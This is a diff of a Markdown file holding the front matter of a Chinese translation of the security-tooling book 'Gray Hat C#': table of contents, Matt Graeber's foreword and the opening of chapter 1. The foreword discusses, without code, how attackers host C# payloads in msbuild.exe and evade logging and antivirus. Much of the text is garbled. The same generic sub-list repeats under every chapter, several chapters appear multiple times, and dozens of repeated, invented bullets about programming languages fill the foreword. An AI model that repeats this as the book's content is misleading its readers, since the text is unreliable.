@@ -1,33 +1,17 @@
+
 # Gray hat C#：黑客创建与自动化安全工具指南
-
-
-
-
-
-
 
 ![](img/059a0f6a8101e80261ab133380da85bd_0_0.png)
 
-
 Matt Graeber 前言
-
 
 ![](img/059a0f6a8101e80261ab133380da85bd_1_0.png)
 
-
-
-
 (mobi)
 
+## Matt Graeber 前言
 
-
-
-
-
-
-# Matt Graeber 前言
-
-# 前言
+## 前言
 
 - 为什么我信任 Mono？
 - 这本书是给谁看的？
@@ -35,7 +19,7 @@ Matt Graeber 前言
 - 致谢
 - 结语
 
-# 1 C# 快速入门
+## 1 C# 快速入门
 
 - 选择 IDE
 - 简单示例
@@ -43,22 +27,21 @@ Matt Graeber 前言
 - 创建一个类
 - 创建接口
 - 从抽象类派生并实现接口
-- 使用 Main() 方法将一切整合在一起
-- 运行 Main() 方法
+- 使用 `Main()` 方法将一切整合在一起
+- 运行 `Main()` 方法
 - 匿名方法
 - 将委托分配给方法
 - 更新消防员类
 - 创建可选参数
-- 更新 Main() 方法
-- 运行更新后的 Main() 方法
+- 更新 `Main()` 方法
+- 运行更新后的 `Main()` 方法
 - 与原生库集成
 - 结论
 
-# 2 XSS 和 SQL 注入的模糊测试与利用
+## 2 XSS 和 SQL 注入的模糊测试与利用
 
 - 设置虚拟机
-
-# 添加主机
+- 添加主机
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -86,7 +69,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 3 SOAP 端模糊测试
+## 3 SOAP 端模糊测试
 
 - 设置虚拟机
 - 简单示例
@@ -106,7 +89,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 4 编写反弹、绑定和 Metasploit 负载
+## 4 编写反弹、绑定和 Metasploit 负载
 
 - 设置虚拟机
 - 简单示例
@@ -126,7 +109,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 5 自动化 Nessus
+## 5 自动化 Nessus
 
 - 设置虚拟机
 - 简单示例
@@ -146,7 +129,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 6 自动化 Nexpose
+## 6 自动化 Nexpose
 
 - 设置虚拟机
 - 简单示例
@@ -166,7 +149,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 7 自动化 OpenVAS
+## 7 自动化 OpenVAS
 
 - 设置虚拟机
 - 简单示例
@@ -186,7 +169,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 8 自动化 Cuckoo 沙箱
+## 8 自动化 Cuckoo 沙箱
 
 - 设置虚拟机
 - 简单示例
@@ -206,7 +189,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 9 自动化 sqlmap
+## 9 自动化 sqlmap
 
 - 设置虚拟机
 - 简单示例
@@ -226,7 +209,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 10 自动化 ClamAV
+## 10 自动化 ClamAV
 
 - 设置虚拟机
 - 简单示例
@@ -246,7 +229,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 11 自动化 Metasploit
+## 11 自动化 Metasploit
 
 - 设置虚拟机
 - 简单示例
@@ -266,7 +249,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 12 自动化 Arachni
+## 12 自动化 Arachni
 
 - 设置虚拟机
 - 简单示例
@@ -286,7 +269,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 13 反编译与反向托管程序集
+## 13 反编译与反向托管程序集
 
 - 设置虚拟机
 - 简单示例
@@ -306,7 +289,7 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 14 读取离线注册表单元
+## 14 读取离线注册表单元
 
 - 设置虚拟机
 - 简单示例
@@ -326,7 +309,8 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 添加主机
+## 添加主机
+
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -345,7 +329,8 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 3 SOAP 端模糊测试
+## 3 SOAP 端模糊测试
+
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -364,7 +349,8 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 4 编写反弹、绑定和 Metasploit 负载
+## 4 编写反弹、绑定和 Metasploit 负载
+
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -383,7 +369,8 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 5 自动化 Nessus
+## 5 自动化 Nessus
+
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -402,7 +389,8 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 6 自动化 Nexpose
+## 6 自动化 Nexpose
+
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -421,7 +409,8 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 7 自动化 OpenVAS
+## 7 自动化 OpenVAS
+
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -440,7 +429,8 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 8 自动化 Cuckoo 沙箱
+## 8 自动化 Cuckoo 沙箱
+
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -459,159 +449,8 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
-# 9 自动化 sqlmap
-- 设置虚拟机
-- 简单示例
-- 介绍类和接口
-- 创建一个类
-- 设置虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
+## 9 自动化 sqlmap
 
-### 添加主机
-- 设置虚拟机
-- 简单示例
-- 介绍类和接口
-- 创建一个类
-- 设置虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-
-# 3 SOAP 端模糊测试
-- 设置虚拟机
-- 简单示例
-- 介绍类和接口
-- 创建一个类
-- 设置虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-
-# 4 编写反弹、绑定和 Metasploit 负载
-- 设置虚拟机
-- 简单示例
-- 介绍类和接口
-- 创建一个类
-- 设置虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-
-# 5 自动化 Nessus
-- 设置虚拟机
-- 简单示例
-- 介绍类和接口
-- 创建一个类
-- 设置虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-
-# 6 自动化 Nexpose
-- 设置虚拟机
-- 简单示例
-- 介绍类和接口
-- 创建一个类
-- 设置虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-
-# 7 自动化 OpenVAS
-- 设置虚拟机
-- 简单示例
-- 介绍类和接口
-- 创建一个类
-- 设置虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-
-# 8 自动化 Cuckoo 沙箱
-- 设置虚拟机
-- 简单示例
-- 介绍类和接口
-- 创建一个类
-- 设置虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-- 跨站脚本
-- SQL 注入
-- 添加虚拟机
-- 跨站脚本
-- SQL 注入
-- 模糊虚拟机
-
-# 9 自动化 sqlmap
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -631,6 +470,7 @@ Matt Graeber 前言
 - 模糊虚拟机
 
 ### 添加主机
+
 - 设置虚拟机
 - 简单示例
 - 介绍类和接口
@@ -649,9 +489,165 @@ Matt Graeber 前言
 - SQL 注入
 - 模糊虚拟机
 
+## 3 SOAP 端模糊测试
 
+- 设置虚拟机
+- 简单示例
+- 介绍类和接口
+- 创建一个类
+- 设置虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
 
+## 4 编写反弹、绑定和 Metasploit 负载
 
+- 设置虚拟机
+- 简单示例
+- 介绍类和接口
+- 创建一个类
+- 设置虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+
+## 5 自动化 Nessus
+
+- 设置虚拟机
+- 简单示例
+- 介绍类和接口
+- 创建一个类
+- 设置虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+
+## 6 自动化 Nexpose
+
+- 设置虚拟机
+- 简单示例
+- 介绍类和接口
+- 创建一个类
+- 设置虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+
+## 7 自动化 OpenVAS
+
+- 设置虚拟机
+- 简单示例
+- 介绍类和接口
+- 创建一个类
+- 设置虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+
+## 8 自动化 Cuckoo 沙箱
+
+- 设置虚拟机
+- 简单示例
+- 介绍类和接口
+- 创建一个类
+- 设置虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+
+## 9 自动化 sqlmap
+
+- 设置虚拟机
+- 简单示例
+- 介绍类和接口
+- 创建一个类
+- 设置虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+
+### 添加主机
+
+- 设置虚拟机
+- 简单示例
+- 介绍类和接口
+- 创建一个类
+- 设置虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
+- 跨站脚本
+- SQL 注入
+- 添加虚拟机
+- 跨站脚本
+- SQL 注入
+- 模糊虚拟机
 
 ## 添加 sqlmap POST 请求支持
 
@@ -662,7 +658,7 @@ Matt Graeber 前言
 ## 10 自动化 CLAMAV
 
 - 安装 ClamAV
-- ClamAV 原生库 vs. clamd 网络守护进程
+- ClamAV 原生库 vs. `clamd` 网络守护进程
 - 使用 ClamAV 原生库进行自动化
 - 设置辅助枚举和类
 - 访问 ClamAV 原生库函数
@@ -670,12 +666,12 @@ Matt Graeber 前言
 - 扫描文件
 - 清理
 - 通过扫描 EICAR 文件测试程序
-- 使用 clamd 进行自动化
-- 安装 clamd 守护进程
-- 启动 clamd 守护进程
-- 为 clamd 创建 Session 类
-- 创建 clamd 管理器类
-- 使用 clamd 进行测试
+- 使用 `clamd` 进行自动化
+- 安装 `clamd` 守护进程
+- 启动 `clamd` 守护进程
+- 为 `clamd` 创建 `Session` 类
+- 创建 `clamd` 管理器类
+- 使用 `clamd` 进行测试
 
 结语
 
@@ -686,11 +682,11 @@ Matt Graeber 前言
 - 为 MonoDevelop 获取 MSGPACK 包管理器
 - 安装 MSGPACK 库
 - 引用 MSGPACK 库
-- 编写 MetasploitSession 类
-- 为 HTTP 请求创建 Execute() 方法并与 MSGPACK 交互
+- 编写 `MetasploitSession` 类
+- 为 HTTP 请求创建 `Execute()` 方法并与 MSGPACK 交互
 - 从 MSGPACK 转换响应数据
 - 测试 session 类
-- 编写 MetasploitManager 类
+- 编写 `MetasploitManager` 类
 - 整合一切
 - 运行利用程序
 
@@ -706,23 +702,23 @@ Matt Graeber 前言
 
 Arachni REST API
 
-创建 ArachniHTTPSession 类
+创建 `ArachniHTTPSession` 类
 
-创建 ArachniHTTPManager 类
+创建 `ArachniHTTPManager` 类
 
-将 Session 类和 Manager 类整合
+将 `Session` 类和 `Manager` 类整合
 
 Arachni RPC
 
 手动运行 RPC
 
-ArachniRPCSession 类
+`ArachniRPCSession` 类
 
-ExecuteCommand() 的辅助方法
+`ExecuteCommand()` 的辅助方法
 
-ExecuteCommand() 方法
+`ExecuteCommand()` 方法
 
-ArachniRPCManager 类
+`ArachniRPCManager` 类
 
 整合一切
 
@@ -734,7 +730,7 @@ ArachniRPCManager 类
 
 测试反编译器
 
-使用 monodis 分析程序集
+使用 `monodis` 分析程序集
 
 结语
 
@@ -756,18 +752,19 @@ ArachniRPCManager 类
 
 转储启动键 (Boot Key)
 
-GetBootKey() 方法
+`GetBootKey()` 方法
 
-- GetValueKey() 方法
-- GetNodeKey() 方法
-- StringToByteArray() 方法
+- `GetValueKey()` 方法
+- `GetNodeKey()` 方法
+- `StringToByteArray()` 方法
+
 获取启动键
+
 验证启动键
 
 结语
 
-
-# 前言
+## 前言
 
 作为开发软件的攻击者或防御者，显然需要决定使用什么语言最合理。理想情况下，选择一种语言不应仅仅因为开发者最熟悉它。相反，应该根据回答一系列问题来选择语言，例如：
 
@@ -785,80 +782,157 @@ C# 一直是 .NET 语言的通用语。正如你将在本书中所看到的，�
 作为一名多年来将攻击性 PowerShell 推向主流的人，在 PowerShell 恶意软件激增之后，我的努力带来了巨大的安全改进和日志设施。最新版本的 PowerShell（本书时为 v5 版本）实现的日志比现有的任何其他脚本语言都多。从防御者的角度来看，这是极佳的。从渗透测试人员、红队成员或攻击者的角度来看，这显著增加了个人攻击的噪点。对于一本关于 C# 的书，我为什么会提到这一点？虽然我承认攻击者在 C# 中开发工具比严格在 PowerShell 中开发工具可以获得更大的灵活性。允许我解释一下：
 
 - .NET 提供了丰富的反射 API，允许人们轻松地在内存中加载并动态与编译后的 C# 程序集交互。随着现在对 PowerShell 有效负载执行了所有额外的内省，反射 API 允许攻击者通过开发一个仅作为 .NET 程序集加载器的 PowerShell 有效负载，从而能够更好地躲避雷达。
-- 正如 Casey Smith (@subTee) 所示，在默认安装的 Windows 上有很多合法的、微软签二进制文件可以作为 C# 有效负载极佳宿主机进程——msbuild.exe 是最隐蔽的之一。使用微软作为 C# 恶意软件的宿主机进程完美体现了“离地攻击”（living off the land）的方法——攻击者可以融入目标环境并引入极少足迹的想法将生存得更久。
+
+
+
+- 正如 Casey Smith (@subTee) 所示，在默认安装的 Windows 上有很多合法的、微软签二进制文件可以作为 C# 有效负载极佳宿主机进程——`msbuild.exe` 是最隐蔽的之一。使用微软作为 C# 恶意软件的宿主机进程完美体现了“离地攻击”（living off the land）的方法——攻击者可以融入目标环境并引入极少足迹的想法将生存得更久。
+
 - 直到为止，反病毒厂商在很大程度上仍不了解 .NET 程序集在运行时的能力。市场上仍有足够的非托管代码恶意软件，使得关注点尚未转移。
+
 - 对于许多熟悉 Java 的开发者来说，他们发现向 C# 的转换是非常平滑的。
+
 - 许多熟悉 PowerShell 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 C++ 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Java 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Python 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 PHP 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Go 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Rust 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 JavaScript 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Swift 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Kotlin 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Ruby 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Perl 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Lua 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Dart 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Haskell 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Scala 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Objective-C 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Java 的开发者发现，向 C# 的转换是非常平滑。
+
 - 许多熟悉 TypeScript 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 F# 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 R 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Clojure 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Erlang 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Prolog 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Smalltalk 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Lisp 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Ada 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 COBOL 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Basic 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Fortran 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 SQL 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 VBS 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 MATLAB 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Shell 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Solidity 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 WebAssembly 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 脚本 (Script) 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Groovy 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Elm 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Haskell 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Scala 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Clojure 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 F# 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Elixir 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Julia 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 OCaml 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Crystal 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Nim 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Go 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 C (C) 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 C++ (C++) 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Java 的开发者发现，向 C# 的转换是非常平滑的。
+
 - 许多熟悉 Python 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 JavaScript 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 TypeScript 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Swift 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Kotlin 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Ruby 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 PHP 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Go 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Rust 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 SQL 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Solidity 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 WebAssembly 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Groovy 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Elm 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 F# 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Elixir 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Julia 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 OCaml 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Crystal 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Nim 的开发者发现，C# 提供了许多它们所没有的功能。
 
 # 前言
@@ -870,10 +944,15 @@ C# 一直是 .NET 语言的通用语。正如你将在本书中所看到的，�
 作为开发软件的攻击者或防御者，显然需要决定使用什么语言最合理。理想情况下，选择一种语言不应仅仅因为开发者最熟悉它。相反，应该根据回答一系列问题来选择语言，例如：
 
 - 我的主要目标执行环境是什么？
+
 - 用这种语言编写的有效负载的检测和日志状态如何？
+
 - 我的软件需要保持何种程度的隐性（例如，内存驻留）？
+
 - 该语言对客户端和服务器端的支持性如何？
+
 - 是否有一个使用该语言开发的大规模社区？
+
 - 学习曲线是什么？该语言的可维护性如何？
 
 C# 对这些问题给出了一些引人注目回答。对于关于目标执行环境的问题，在以微软为主的环境中，NET 显然是一个值得考虑的候选者，因为多年来它一直随 Windows 发发。然而，随着 .NET 的开源，C# 现在是一门可以在每个操作系统上驱动成熟运行时环境的语言。自然地，它应该被认为是一种极其高效的跨平台支持语言。
@@ -883,39 +962,64 @@ C# 一直是 .NET 语言的通用语。正如你将在本书中所看到的，�
 作为一名多年来将攻击性 PowerShell 推向主流的人，在 PowerShell 恶意软件激增之后，我的努力带来了巨大的安全改进和日志设施。最新版本的 PowerShell（本书时为 v5 版本）实现的日志比现有的任何其他脚本语言都多。从防御者的角度来看，这是极佳的。从渗透测试人员、红队成员或攻击者的角度来看，这显著增加了个人攻击的噪点。对于一本关于 C# 的书，我为什么会提到这一点？虽然我承认攻击者在 C# 中开发工具比严格在 PowerShell 中开发工具可以获得更大的灵活性。允许我解释一下：
 
 - .NET 提供了丰富的反射 API，允许人们轻松地在内存中加载并动态与编译后的 C# 程序集交互。随着现在对 PowerShell 有负载执行了所有额外的内省，反射 API 允许攻击者通过开发一个仅作为 .NET 程序集加载器的 PowerShell 有效负载，从而能够更好地躲避雷达。
-- 正如 Casey Smith (@subTee) 所示，在默认安装的 Windows 上有很多合法的、微软签二进制文件可以作为 C# 有效负载极佳宿主机进程——msbuild.exe 是最隐蔽的之一。使用微软作为 C# 恶意软件的宿主机进程完美体现了“离地攻击”（living off the land）的方法——攻击者可以融入目标环境并引入极少足迹的想法将生存得更久。
+
+- 正如 Casey Smith (@subTee) 所示，在默认安装的 Windows 上有很多合法的、微软签二进制文件可以作为 C# 有效负载极佳宿主机进程——`msbuild.exe` 是最隐蔽的之一。使用微软作为 C# 恶意软件的宿主机进程完美体现了“离地攻击”（living off the land）的方法——攻击者可以融入目标环境并引入极少足迹的想法将生存得更久。
+
 - 直到为止，反病毒厂商在很大程度上仍不了解 .NET 程序集在运行时的能力。市场上仍有足够的非托管代码恶意软件，使得关注点尚未转移。
+
 - 对于许多熟悉 Java 的开发者来说，他们发现向 C# 的转换是非常平滑的。
+
 - 许多熟悉 TypeScript 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 F# 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 R 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Clojure 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Erlang 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Prolog 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Smalltalk 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Lisp 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Ada 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 COBOL 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Basic 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Fortran 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 SQL 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 VBS 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 MATLAB 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Shell 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Solidity 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 WebAssembly 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 脚本 (Script) 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Groovy 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Elm 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Elixir 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Julia 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 OCaml 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Crystal 的开发者发现，C# 提供了许多它们所没有的功能。
+
 - 许多熟悉 Nim 的开发者发现，C# 提供了许多它们所没有的功能。
-
-
-
-
 
 Mono 项目和 C# 语言的反对者声称，这些技术在 Windows以外的任何平台上使用都是不安全的。他们认为微软会随时开始诉讼直到 Mono 灭亡，这种信念让许多人甚至不敢认真对待这个项目。我不认为这是一个可靠的风险。截至本文撰笔时，微软不仅收购了 Xamarin（Miguel de Icaza 为支持 Mono 框架而创建的公司），还将 .NET 框架的大部分核心内容开源了。它以一种许多人认为在 Steve Ballmer 领导下无法想象的方式拥抱了开源软件。新任执行官 Satya Nadella 证明了微软对开源软件完全没有问题，公司正积极参与 Mono 社区，以实现使用微软技术进行移动开发。
 
@@ -969,6 +1073,8 @@ Mono 项目和 C# 语言的反对者声称，这些技术在 Windows以外的任
 
 ## 第 11 章：自动化 Metasploit
 
+
+
 在本章中，我们将通过 Metasploit 的核心框架来驱动其利用。
 
 ## 第 12 章：自动化 Arachni
@@ -991,11 +1097,8 @@ Mono 项目和 C# 语言的反对者声称，这些技术在 Windows以外的任
 
 每一章都仅仅触及 C# 力量的皮角，以及我们自动化和构建的工具的潜力——特别是由于我们创建的许多库都是为了灵活扩展而设计的。我希望这本书能向你展示自动化枯燥或重复任务是多么简单，并激励你继续构建我们开始的工具。你可以在此处找到源代码和书籍更新：https://www.nostarch.com/grayhatcsharp/。
 
-
-
-
-
 # 1
+
 # C# 快速入门
 
 ![](img/059a0f6a8101e80261ab133380da85bd_20_0.png)
@@ -1006,7 +1109,7 @@ Mono 项目和 C# 语言的反对者声称，这些技术在 Windows以外的任
 
 大多数想学习 C# 的人会使用集成开发环境（IDE），如 Visual Studio，来编写和编译代码。微软的 Visual Studio 是全球 C# 开发的事实标准。免费版本（如 Visual Studio 社区版）供个人使用，并可以从微软网站 https://www.visualstudio.com/downloads/ 下载。
 
-在本书的编写过程中，我根据是在 Ubuntu 还是 OS X 上分别使用了 MonoDevelop 和 Xamarin Studio。在 Ubuntu 上，你可以使用 apt 包管理器轻松安装 MonoDevelop。MonoDevelop 由 Xamarin 公司维护，该公司也维护 Mono。要安装它，请使用以下命令：$ sudo apt-get install monodevelop
